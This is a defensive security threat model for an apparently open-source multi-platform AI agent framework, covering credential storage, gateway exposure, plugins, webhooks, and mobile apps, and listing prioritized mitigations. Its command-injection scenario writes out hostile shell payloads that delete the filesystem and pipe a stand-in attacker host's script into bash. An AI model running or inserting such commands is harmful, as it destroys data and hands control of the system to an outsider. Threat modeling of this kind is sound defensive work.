# OpenClaw Security Threat Model

## Executive Summary

OpenClaw is a multi-platform AI agent framework supporting communication channels including Discord, Slack, Telegram, IRC, iMessage, Signal, Google Chat, and MS Teams. This threat model identifies security risks across credential management, conversation data, personal information handling, and platform-specific attack surfaces.

## 1. Asset Identification

### 1.1 Critical Assets

#### 1.1.1 Authentication Credentials
**Location**: `src/config/types.auth.ts`, `src/config/redact-snapshot.ts`

- **API Keys and Tokens**:
  - Discord bot tokens (`src/config/types.discord.ts`)
  - Slack tokens (bot, user, app-level) 
  - Telegram bot tokens with webhook secrets (`src/config/telegram-webhook-secret.test.ts`)
  - IRC server passwords (`src/config/types.irc.ts`)
  - Signal credentials (`src/config/types.signal.ts`)
  - Google Chat service account keys (`src/config/types.googlechat.ts`)
  - MS Teams authentication (`src/config/types.msteams.ts`)
  - LLM provider API keys (OpenAI, Anthropic, etc.)

- **Redaction Coverage** (`src/config/redact-snapshot.ts`):
  ```typescript
  // Lines 67-170: Comprehensive credential redaction
  - apiKey, token, password, secret fields
  - Authorization headers
  - Webhook URLs
  - Database connection strings
  - OAuth credentials
  ```

#### 1.1.2 Conversation Data
**Location**: Agent directories, memory storage

- **Stored Conversations**: Full message history including user inputs and AI responses
- **Context Windows**: Cached conversation state for agent continuity
- **Message Attachments**: Files shared through channels
- **User Metadata**: Usernames, channel IDs, timestamps

#### 1.1.3 Personal Identifiable Information
**Location**: Configuration files, agent profiles

- **Identity Configuration** (`src/config/types.base.ts`):
  - Agent names and avatars
  - Custom user identities per channel
  - Profile information

- **Channel-Specific PII**:
  - Phone numbers (Signal, Telegram)
  - Email addresses (Google Chat, MS Teams)
  - User IDs across platforms

#### 1.1.4 System Configuration
**Location**: `src/config/` directory

- **Agent Directories** (`src/config/agent-dirs.ts`):
  - File system paths to sensitive data
  - Configuration file locations
  - Log and cache directories

- **Environment Variables** (`src/config/env-vars.ts`, `src/config/env-preserve.ts`):
  - System-level credentials
  - API endpoints
  - Feature flags

### 1.2 Data Storage Locations

- **Configuration Files**: YAML/JSON in `~/.config/openclaw/` or agent-specific directories
- **Session Storage** (`src/config/sessions/`): Cached agent state
- **Backup Files** (`src/config/backup-rotation.ts`): Rotated configuration backups
- **Memory Cache** (`src/config/cache-utils.ts`): Runtime credential and conversation caching
- **Mobile Apps**: iOS (`apps/ios/`) and Android (`apps/android/`) local storage

## 2. Threat Actor Analysis

### 2.1 External Attackers

#### 2.1.1 Network-Based Attackers
- **Capability**: Intercept network traffic, exploit API vulnerabilities
- **Motivation**: Credential theft, data exfiltration
- **Attack Vectors**:
  - Man-in-the-middle attacks on channel connections
  - Compromised webhook endpoints
  - API key extraction from network traffic

#### 2.1.2 Supply Chain Attackers
- **Capability**: Inject malicious code via dependencies
- **Motivation**: Widespread credential compromise
- **Attack Vectors**:
  - Compromised npm packages
  - Malicious plugins (`src/config/types.plugins.ts`)
  - Trojanized mobile app builds

### 2.2 Insider Threats

#### 2.2.1 Malicious Administrators
- **Capability**: Direct system access, configuration modification
- **Motivation**: Data theft, sabotage
- **Attack Vectors**:
  - Configuration file exfiltration
  - Log analysis for credential extraction
  - Agent impersonation

#### 2.2.2 Compromised User Accounts
- **Capability**: Channel-level access
- **Motivation**: Information gathering, social engineering
- **Attack Vectors**:
  - Direct messaging to agents
  - Command injection via chat inputs
  - Phishing through agent interactions

### 2.3 Platform-Specific Threats

#### 2.3.1 Mobile Platform Threats
- **iOS** (`apps/ios/`): Jailbreak exploitation, keychain access
- **Android** (`apps/android/`): Root access, insecure storage
- **Common Risks**: Device loss, OS vulnerabilities, insecure backups

## 3. Attack Vector Assessment

### 3.1 Network Attack Vectors

#### 3.1.1 API Communication Channels

**Discord** (`src/config/types.discord.ts`):
- **Threat**: Token compromise via websocket sniffing
- **Asset at Risk**: Bot tokens (lines 23-33)
- **Impact**: Full bot account takeover
- **Likelihood**: Medium (requires network position)

**Slack**:
- **Threat**: Multi-token exposure (bot, user, app-level)
- **Asset at Risk**: OAuth tokens, webhook URLs
- **Impact**: Workspace-wide data access
- **Likelihood**: Medium-High (HTTP-based, multiple token types)

**Telegram** (`src/config/telegram-webhook-secret.test.ts`):
- **Threat**: Webhook secret compromise enabling message forgery
- **Asset at Risk**: Bot API tokens, webhook secrets
- **Impact**: Message injection, command execution
- **Likelihood**: Medium (webhook validation mitigates)

**IRC** (`src/config/schema.irc.ts`, `src/config/types.irc.ts`):
- **Threat**: Plaintext password transmission
- **Asset at Risk**: Server passwords, NickServ credentials (lines 15-30)
- **Impact**: Account compromise, channel takeover
- **Likelihood**: High (legacy protocol, often no TLS)

**Signal** (`src/config/types.signal.ts`):
- **Threat**: Phone number enumeration, registration token theft
- **Asset at Risk**: Phone numbers, registration IDs
- **Impact**: Identity spoofing
- **Likelihood**: Low-Medium (E2EE provides protection)

#### 3.1.2 Gateway Exposure (`src/config/types.gateway.ts`)

**HTTP Gateway** (lines 45-120):
- **Threat**: Unauthenticated API endpoints
- **Asset at Risk**: Agent control interfaces
- **Impact**: Arbitrary command execution
- **Likelihood**: High if publicly exposed

**Webhook Handlers**:
- **Threat**: Replay attacks, signature bypass
- **Asset at Risk**: Message processing pipeline
- **Impact**: Unauthorized message injection
- **Likelihood**: Medium (depends on validation implementation)

### 3.2 Local System Attack Vectors

#### 3.2.1 File System Access

**Configuration Files** (`src/config/config-paths.ts`):
```typescript
// Lines 20-65: Sensitive file locations
- ~/.config/openclaw/config.yml
- Agent-specific directories
- Session caches
- Backup files
```
- **Threat**: Unauthorized file access
- **Asset at Risk**: All credentials, conversation history
- **Impact**: Complete system compromise
- **Likelihood**: High (file permissions dependent)

**Agent Directories** (`src/config/agent-dirs.ts`):
- **Threat**: Path traversal, directory enumeration
- **Asset at Risk**: Multi-agent configuration data
- **Impact**: Cross-agent data exposure
- **Likelihood**: Medium (requires local access)

#### 3.2.2 Memory-Based Attacks

**Runtime Credential Storage** (`src/config/cache-utils.ts`):
- **Threat**: Memory dumping, process inspection
- **Asset at Risk**: Cached API keys, session tokens
- **Impact**: Active credential theft
- **Likelihood**: Low (requires elevated privileges)

**Session Management** (`src/config/sessions/`):
- **Threat**: Session hijacking via cache poisoning
- **Asset at Risk**: Active conversation context
- **Impact**: Agent impersonation
- **Likelihood**: Medium

### 3.3 Supply Chain Attack Vectors

#### 3.3.1 Dependency Vulnerabilities

**Plugin System** (`src/config/types.plugins.ts`, `src/config/plugin-auto-enable.ts`):
```typescript
// Lines 1-50: Plugin loading mechanism
- Auto-enable based on configuration
- Dynamic module loading
- Unvalidated plugin code execution
```
- **Threat**: Malicious plugin injection
- **Asset at Risk**: Full system access
- **Impact**: Remote code execution
- **Likelihood**: Medium-High (if plugin validation weak)

**Hook System** (`src/config/types.hooks.ts`):
- **Threat**: Custom code execution at lifecycle events
- **Asset at Risk**: Pre/post message processing
- **Impact**: Data interception, credential theft
- **Likelihood**: Medium

#### 3.3.2 Build Pipeline Risks

**Mobile App Builds**:
- **iOS** (`apps/ios/project.yml`): Code signing compromise
- **Android** (`apps/android/build.gradle.kts`): APK tampering
- **Threat**: Distribution of trojanized applications
- **Impact**: Device compromise, credential exfiltration
- **Likelihood**: Low (requires build system access)

### 3.4 Application-Level Attack Vectors

#### 3.4.1 Command Injection

**Custom Commands** (`src/config/commands.ts`, `src/config/telegram-custom-commands.ts`):
- **Threat**: User input passed to shell or eval contexts
- **Asset at Risk**: System execution environment
- **Impact**: Arbitrary code execution
- **Likelihood**: High if input sanitization missing

#### 3.4.2 Approval Bypass (`src/config/types.approvals.ts`)

- **Threat**: Circumventing approval workflows for sensitive operations
- **Asset at Risk**: Tool execution, file access
- **Impact**: Unauthorized actions
- **Likelihood**: Medium (depends on implementation strictness)

#### 3.4.3 Sandbox Escape (`src/config/types.sandbox.ts`)

**Docker Sandbox** (`src/config/config.sandbox-docker.test.ts`):
- **Threat**: Container breakout via misconfiguration
- **Asset at Risk**: Host system access
- **Impact**: Full system compromise
- **Likelihood**: Low-Medium (Docker security dependent)

### 3.5 Mobile-Specific Attack Vectors

#### 3.5.1 iOS Platform (`apps/ios/`)

- **Threat**: Keychain extraction post-jailbreak
- **Asset at Risk**: Stored credentials
- **Impact**: Account compromise
- **Likelihood**: Low (requires jailbreak)

- **Threat**: Insecure app backups
- **Asset at Risk**: Configuration files in backup
- **Impact**: Credential exposure
- **Likelihood**: Medium (iCloud backups)

#### 3.5.2 Android Platform (`apps/android/`)

- **Threat**: Shared storage access
- **Asset at Risk**: Configuration files in external storage
- **Impact**: Data exposure to other apps
- **Likelihood**: High (if using external storage)

- **Threat**: Debug mode exploitation
- **Asset at Risk**: Runtime debugging access
- **Impact**: Memory inspection, credential theft
- **Likelihood**: Medium (debug builds)

## 4. Risk Assessment and Impact Analysis

### 4.1 Critical Risks (P0)

#### 4.1.1 Plaintext Credential Storage
- **Affected Components**: Configuration files, environment variables
- **Attack Vector**: File system access, memory dumping
- **Impact**: Complete account compromise across all channels
- **Affected Files**: 
  - `src/config/env-vars.ts`
  - `src/config/env-preserve.ts`
  - Agent configuration YAML/JSON files
- **CVSS Score**: 9.8 (Critical)

#### 4.1.2 IRC Plaintext Password Transmission
- **Affected Components**: IRC channel integration
- **Attack Vector**: Network sniffing
- **Impact**: IRC account takeover, channel access
- **Affected Files**: 
  - `src/config/types.irc.ts` (lines 15-40)
  - `src/config/schema.irc.ts`
- **CVSS Score**: 8.1 (High)

#### 4.1.3 Unauthenticated Gateway Endpoints
- **Affected Components**: HTTP/WebSocket gateway
- **Attack Vector**: Direct network access
- **Impact**: Arbitrary command execution, agent control
- **Affected Files**: 
  - `src/config/types.gateway.ts` (lines 45-120)
- **CVSS Score**: 9.1 (Critical)

### 4.2 High Risks (P1)

#### 4.2.1 Plugin Code Execution Without Validation
- **Affected Components**: Plugin system
- **Attack Vector**: Malicious plugin installation
- **Impact**: Remote code execution, credential theft
- **Affected Files**: 
  - `src/config/plugin-auto-enable.ts` (lines 1-250)
  - `src/config/types.plugins.ts`
- **CVSS Score**: 8.8 (High)

#### 4.2.2 Webhook Signature Bypass Potential
- **Affected Components**: Telegram, Slack, Google Chat webhooks
- **Attack Vector**: Forged webhook requests
- **Impact**: Message injection, command execution
- **Affected Files**: 
  - `src/config/telegram-webhook-secret.test.ts`
- **CVSS Score**: 7.5 (High)

#### 4.2.3 Session Cache Poisoning
- **Affected Components**: Session management
- **Attack Vector**: Cache file manipulation
- **Impact**: Agent impersonation, context hijacking
- **Affected Files**: 
  - `src/config/sessions/`
  - `src/config/cache-utils.ts`
- **CVSS Score**: 7.2 (High)

### 4.3 Medium Risks (P2)

#### 4.3.1 Configuration File Exposure
- **Affected Components**: Agent directories, backup files
- **Attack Vector**: Insecure file permissions
- **Impact**: Credential disclosure, conversation history exposure
- **Affected Files**: 
  - `src/config/agent-dirs.ts`
  - `src/config/backup-rotation.ts`
- **CVSS Score**: 6.5 (Medium)

#### 4.3.2 Environment Variable Leakage
- **Affected Components**: Environment variable handling
- **Attack Vector**: Log files, error messages, debug output
- **Impact**: API key exposure
- **Affected Files**: 
  - `src/config/env-substitution.ts`
  - `src/config/env-preserve-io.test.ts`
- **CVSS Score**: 6.2 (Medium)

#### 4.3.3 Mobile App Insecure Storage
- **Affected Components**: iOS and Android applications
- **Attack Vector**: Device backup, local file access
- **Impact**: Credential exposure on lost/stolen devices
- **Affected Files**: 
  - `apps/ios/`
  - `apps/android/`
- **CVSS Score**: 6.8 (Medium)

### 4.4 Low Risks (P3)

#### 4.4.1 Debug Logging of Sensitive Data
- **Affected Components**: Logging system
- **Attack Vector**: Log file analysis
- **Impact**: Information disclosure
- **Affected Files**: 
  - `src/config/logging.ts`
- **CVSS Score**: 4.3 (Medium-Low)

#### 4.4.2 Redaction Bypass in Snapshots
- **Affected Components**: Configuration snapshot redaction
- **Attack Vector**: Incomplete redaction patterns
- **Impact**: Credential exposure in diagnostics
- **Affected Files**: 
  - `src/config/redact-snapshot.ts` (lines 67-170)
  - `src/config/redact-snapshot.test.ts`
- **CVSS Score**: 5.3 (Medium)

## 5. Security Controls and Mitigations

### 5.1 Implemented Controls

#### 5.1.1 Credential Redaction System
**File**: `src/config/redact-snapshot.ts`

```typescript
// Lines 67-170: Comprehensive redaction patterns
const REDACT_PATTERNS = {
  apiKey: '***REDACTED-API-KEY***',
  token: '***REDACTED-TOKEN***',
  password: '***REDACTED-PASSWORD***',
  secret: '***REDACTED-SECRET***',
  webhookUrl: '***REDACTED-WEBHOOK-URL***',
  authorization: '***REDACTED-AUTH-HEADER***'
}
```

**Coverage**:
- API keys and tokens across all channel types
- Database credentials
- Webhook URLs and secrets
- OAuth tokens
- Authorization headers

**Limitations**:
- Pattern-based only (may miss new credential types)
- No runtime encryption of redacted values
- Redaction occurs at snapshot time (credentials still in memory)

#### 5.1.2 Webhook Secret Validation
**File**: `src/config/telegram-webhook-secret.test.ts`

- **Control**: Validates webhook signatures before processing
- **Implementation**: Secret-based HMAC verification
- **Limitation**: Test file indicates validation exists but implementation details not in provided files

#### 5.1.3 Environment Variable Preservation
**File**: `src/config/env-preserve.ts`

```typescript
// Lines 1-100: Selective environment variable handling
- Preserves only necessary environment variables
- Filters sensitive variables from propagation
- Controls variable substitution
```

**Benefits**:
- Reduces environment variable leakage
- Limits exposure to child processes

#### 5.1.4 Configuration File Permissions
**File**: `src/config/config-paths.ts`

- **Control**: Structured configuration directory hierarchy
- **Implementation**: Uses standard system paths (`~/.config/openclaw/`)
- **Limitation**: No explicit permission setting in code (OS-dependent)

### 5.2 Missing Controls (Gaps)

#### 5.2.1 Credential Encryption at Rest

**Risk**: Plaintext storage of API keys and tokens
**Required Control**: 
- Encrypt configuration files using system keychain
- Key derivation from user password or system-level key
- Platform-specific secure storage (Keychain on iOS/macOS, KeyStore on Android)

**Implementation Recommendation**:
```typescript
// Proposed: src/config/encryption.ts
interface SecureStorage {
  encrypt(data: string, keyId: string): Promise<string>;
  decrypt(data: string, keyId: string): Promise<string>;
  storeKey(keyId: string, key: Buffer): Promise<void>;
}
```

#### 5.2.2 TLS Enforcement for IRC

**Risk**: Plaintext password transmission on IRC connections
**Required Control**: 
- Mandatory TLS for IRC connections
- Certificate validation
- Reject plaintext fallback

**Implementation Recommendation**:
```typescript
// Proposed addition to src/config/types.irc.ts
interface IrcConfig {
  tls: {
    enabled: boolean;  // Should be required: true
    rejectUnauthorized: boolean;  // Certificate validation
    minVersion: 'TLSv1.2' | 'TLSv1.3';
  }
}
```

#### 5.2.3 Gateway Authentication

**Risk**: Unauthenticated HTTP/WebSocket endpoints
**Required Control**: 
- API key or JWT-based authentication
- Rate limiting per client
- IP allowlisting option

**Implementation Recommendation**:
```typescript
// Proposed: src/config/types.gateway.ts enhancement
interface GatewayAuth {
  apiKeys: string[];  // Hashed API keys
  jwt: {
    secret: string;
    algorithm: 'HS256' | 'RS256';
    expiresIn: string;
  };
  ipAllowlist?: string[];
}
```

#### 5.2.4 Plugin Signature Verification

**Risk**: Unsigned plugin code execution
**Required Control**: 
- Code signing for plugins
- Signature verification before loading
- Trusted plugin registry

**Implementation Recommendation**:
```typescript
// Proposed: src/config/plugin-security.ts
interface PluginSignature {
  verifySignature(pluginPath: string, signature: string): Promise<boolean>;
  getTrustedPublicKeys(): string[];
  checkPluginRegistry(pluginId: string): Promise<boolean>;
}
```

#### 5.2.5 Sandbox Hardening

**Risk**: Docker container misconfiguration
**Required Control**: 
- Minimal container capabilities
- Read-only root filesystem
- Network isolation
- Resource limits

**Implementation Recommendation**:
```typescript
// Proposed enhancement to src/config/types.sandbox.ts
interface DockerSandbox {
  security: {
    capabilities: {
      drop: ['ALL'];
      add: string[];  // Minimal required only
    };
    readOnlyRootFilesystem: true;
    noNewPrivileges: true;
    seccompProfile: string;
  };
  resources: {
    cpuQuota: number;
    memoryLimit: string;
    pidsLimit: number;
  };
}
```

#### 5.2.6 Input Sanitization Framework

**Risk**: Command injection via custom commands
**Required Control**: 
- Input validation library
- Parameterized command execution
- Allowlist-based command filtering

**Implementation Recommendation**:
```typescript
// Proposed: src/config/input-validation.ts
interface InputValidator {
  sanitize(input: string, context: 'shell' | 'eval' | 'sql'): string;
  validate(input: string, rules: ValidationRule[]): ValidationResult;
  escapeShellArg(arg: string): string;
}
```

#### 5.2.7 Session Integrity Verification

**Risk**: Session cache tampering
**Required Control**: 
- HMAC signing of session files
- Integrity verification on load
- Expiration timestamps

**Implementation Recommendation**:
```typescript
// Proposed: src/config/sessions/integrity.ts
interface SessionIntegrity {
  sign(sessionData: object): string;
  verify(sessionData: object, signature: string): boolean;
  isExpired(session: Session): boolean;
}
```

#### 5.2.8 Mobile App Security Hardening

**iOS** (`apps/ios/`):
- Enable App Transport Security (ATS)
- Keychain protection with kSecAttrAccessibleWhenUnlockedThisDeviceOnly
- Disable backup for sensitive files

**Android** (`apps/android/`):
- Use EncryptedSharedPreferences for credentials
- Enable SafetyNet attestation
- ProGuard obfuscation for release builds
- Network security config with certificate pinning

### 5.3 Compensating Controls

#### 5.3.1 File System Permissions
- **Control**: OS-level file permissions on configuration directories
- **Implementation**: Set `chmod 600` on config files, `chmod 700` on directories
- **Effectiveness**: Medium (OS-dependent, user must configure)

#### 5.3.2 Network Segmentation
- **Control**: Firewall rules limiting gateway exposure
- **Implementation**: Deploy behind reverse proxy, use VPN
- **Effectiveness**: High (reduces attack surface)

#### 5.3.3 Monitoring and Alerting
- **Control**: Log suspicious activities (failed auth, unusual commands)
- **Implementation**: Integration with SIEM systems
- **Effectiveness**: Medium (detective, not preventive)

#### 5.3.4 Principle of Least Privilege
- **Control**: Separate credentials per channel with minimal scopes
- **Implementation**: Use bot accounts with restricted permissions
- **Effectiveness**: High (limits blast radius)

### 5.4 Operational Security Practices

#### 5.4.1 Credential Rotation
- **Practice**: Regular rotation of API keys and tokens
- **Frequency**: 90 days or on suspected compromise
- **Process**: Update configuration, restart agents

#### 5.4.2 Backup Security
**File**: `src/config/backup-rotation.ts`
- **Practice**: Encrypt backup files before storage
- **Implementation**: Apply same encryption as main config
- **Rotation**: Delete backups older than retention period

#### 5.4.3 Audit Logging
- **Practice**: Log all credential access and configuration changes
- **Format**: Structured logs with timestamps, user, action
- **Retention**: Maintain logs per compliance requirements

#### 5.4.4 Dependency Scanning
- **Practice**: Regular vulnerability scanning of npm packages
- **Tools**: npm audit, Snyk, Dependabot
- **Frequency**: Pre-deployment and weekly in production

## 6. Threat Scenarios and Mitigations

### 6.1 Scenario 1: Stolen Configuration File

**Attack Chain**:
1. Attacker gains read access to `~/.config/openclaw/config.yml`
2. Extracts plaintext API keys for Discord, Slack, Telegram
3. Uses credentials to impersonate bot, exfiltrate conversation history

**Current State**: High risk - credentials stored in plaintext

**Mitigations**:
- **Immediate**: Set file permissions to 600, limit user access
- **Short-term**: Implement credential encryption at rest (Section 5.2.1)
- **Long-term**: Use system keychain integration, hardware security modules

### 6.2 Scenario 2: Network Interception of IRC Credentials

**Attack Chain**:
1. User connects to IRC server without TLS
2. Attacker on network path captures plaintext password
3. Attacker authenticates to IRC, issues commands as agent

**Current State**: High risk - TLS not enforced (`src/config/types.irc.ts`)

**Mitigations**:
- **Immediate**: Document TLS requirement, add config validation
- **Short-term**: Make TLS mandatory in IRC config (Section 5.2.2)
- **Long-term**: Remove support for non-TLS IRC connections

### 6.3 Scenario 3: Malicious Plugin Installation

**Attack Chain**:
1. Attacker publishes malicious npm package matching plugin naming convention
2. User installs package via `npm install`
3. Plugin auto-enables via `src/config/plugin-auto-enable.ts`
4. Malicious code executes with full agent privileges, exfiltrates credentials

**Current State**: Medium-high risk - no signature verification

**Mitigations**:
- **Immediate**: Document trusted plugin sources
- **Short-term**: Implement plugin allowlist, disable auto-enable for untrusted sources
- **Long-term**: Plugin signature verification (Section 5.2.4)

### 6.4 Scenario 4: Webhook Forgery

**Attack Chain**:
1. Attacker discovers webhook URL through error message or logs
2. Crafts malicious webhook request without valid signature
3. If validation weak, injects commands to agent
4. Agent executes attacker commands, potentially accessing files or systems

**Current State**: Medium risk - validation exists but strength unknown

**Mitigations**:
- **Immediate**: Audit webhook signature validation implementation
- **Short-term**: Rotate webhook secrets, add timestamp validation
- **Long-term**: Implement mutual TLS for webhook endpoints

### 6.5 Scenario 5: Mobile Device Compromise

**Attack Chain** (Android):
1. User device with OpenClaw app is lost/stolen or has malware installed
2. Attacker gains root access or exploits insecure storage
3. Extracts configuration from app data directory
4. Obtains all channel credentials stored on device

**Current State**: Medium risk - depends on app implementation

**Mitigations**:
- **Immediate**: Document device security requirements (encryption, PIN)
- **Short-term**: Implement EncryptedSharedPreferences for Android, Keychain for iOS
- **Long-term**: Remote wipe capability, device attestation before credential access

### 6.6 Scenario 6: Command Injection via Custom Commands

**Attack Chain**:
1. Administrator configures custom command in `src/config/commands.ts`
2. Command includes user input without sanitization: `exec($USER_INPUT)`
3. Attacker sends crafted message with shell metacharacters
4. Agent executes arbitrary commands: `; rm -rf /` or `; curl attacker.com | bash`

**Current State**: High risk - no input validation framework

**Mitigations**:
- **Immediate**: Audit existing custom commands, remove dangerous patterns
- **Short-term**: Implement input sanitization (Section 5.2.6)
- **Long-term**: Sandboxed command execution, parameterized APIs only

### 6.7 Scenario 7: Gateway Exploitation

**Attack Chain**:
1. HTTP gateway exposed on public IP without authentication
2. Attacker scans port, discovers OpenClaw gateway
3. Sends API requests to control agent, execute tools
4. Leverages tool execution to access file system, run code

**Current State**: Critical risk - no authentication in gateway config

**Mitigations**:
- **Immediate**: Deploy behind authenticated reverse proxy, use VPN
- **Short-term**: Implement gateway authentication (Section 5.2.3)
- **Long-term**: Zero-trust architecture with mutual TLS

## 7. Security Recommendations by Priority

### 7.1 Critical (Implement Immediately)

1. **Encrypt Configuration Files at Rest**
   - Implement system keychain integration
   - Files: `src/config/io.ts`, new `src/config/encryption.ts`
   - Estimated Effort: 2-3 weeks

2. **Enforce TLS for IRC Connections**
   - Reject plaintext connections
   - Files: `src/config/types.irc.ts`, `src/config/schema.irc.ts`
   - Estimated Effort: 1 week

3. **Implement Gateway Authentication**
   - Add API key or JWT validation
   - Files: `src/config/types.gateway.ts`
   - Estimated Effort: 1-2 weeks

4. **Secure File Permissions Setup Script**
   - Auto-configure proper permissions on install
   - New script: `scripts/secure-install.sh`
   - Estimated Effort: 3 days

### 7.2 High (Implement Within 1 Month)

5. **Plugin Signature Verification**
   - Code signing requirement for plugins
   - Files: New `src/config/plugin-security.ts`
   - Estimated Effort: 2 weeks

6. **Input Sanitization Framework**
   - Validation for all user inputs
   - Files: New `src/config/input-validation.ts`, `src/config/commands.ts`
   - Estimated Effort: 2 weeks

7. **Session Integrity Protection**
   - HMAC signing of session files
   - Files: `src/config/sessions/`, new `integrity.ts`
   - Estimated Effort: 1 week

8. **Mobile App Secure Storage**
   - Keychain/KeyStore integration
   - Files: `apps/ios/`, `apps/android/`
   - Estimated Effort: 2-3 weeks

### 7.3 Medium (Implement Within 3 Months)

9. **Enhanced Redaction Coverage**
   - Extend patterns, runtime encryption
   - Files: `src/config/redact-snapshot.ts`
   - Estimated Effort: 1 week

10. **Sandbox Hardening**
    - Security profiles for Docker
    - Files: `src/config/types.sandbox.ts`
    - Estimated Effort: 1-2 weeks

11. **Audit Logging Framework**
    - Structured logging of security events
    - Files: New `src/config/audit-log.ts`
    - Estimated Effort: 2 weeks

12. **Dependency Vulnerability Scanning**
    - Automated scanning in CI/CD
    - CI configuration updates
    - Estimated Effort: 1 week

### 7.4 Low (Ongoing/Nice-to-Have)

13. **Rate Limiting per Channel**
    - Prevent abuse via throttling
    - Files: Channel-specific adapters
    - Estimated Effort: 2 weeks

14. **Credential Rotation Automation**
    - Scheduled rotation workflows